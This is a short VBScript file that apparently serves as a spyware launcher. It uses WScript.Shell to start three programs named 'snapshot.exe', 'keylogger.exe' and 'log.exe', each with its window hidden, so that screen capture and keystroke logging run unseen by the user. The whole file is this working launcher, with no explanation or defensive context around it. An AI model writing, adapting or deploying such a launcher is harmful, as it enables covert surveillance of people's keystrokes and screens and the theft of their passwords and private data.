Dim WShell
Set WShell = CreateObject("WScript.Shell")
WShell.Run "snapshot.exe", 0
WShell.Run "keylogger.exe", 0
WShell.Run "log.exe", 0
Set WShell = Nothing